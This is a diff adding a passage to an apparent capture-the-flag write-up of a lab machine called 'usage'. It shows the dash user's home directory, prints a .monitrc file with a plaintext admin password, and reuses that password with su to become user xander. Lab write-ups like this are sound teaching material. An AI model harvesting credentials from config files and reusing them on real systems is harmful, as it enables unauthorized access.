@@ -562,3 +562,93 @@ We've got the `user.txt` flag!
 # Privilege Escalation: dash -> xander
 
 <br />
+
+### .monitrc:
+
+<br />
+
+Once inside the system, we found not a typical file called `".monitrc"` into `/home/dash`:
+
+<br />
+
+```bash
+dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 May  1 19:38 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 May  1 19:38 .monit.pid
+-rw------- 1 dash dash 1192 May  1 19:38 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 May  1 19:32 user.txt
+```
+
+<br />
+
+Let's see its content:
+
+<br />
+
+```bash
+dash@usage:~$ cat .monitrc 
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+
+<br />
+
+We have credentials: `admin:3nc0d3d_pa$$w0rd`
+
+Looking for other users in this machine we find `xander`:
+
+<br />
+
+```bash
+dash@usage:/home$ ls
+dash  xander
+```
+
+<br />
+
+We can use the new `password` to log in:
+
+<br />
+
+```bash
+dash@usage:/home$ su xander
+Password: 
+xander@usage:/home$ id
+uid=1001(xander) gid=1001(xander) groups=1001(xander)
+```
+
+<br />
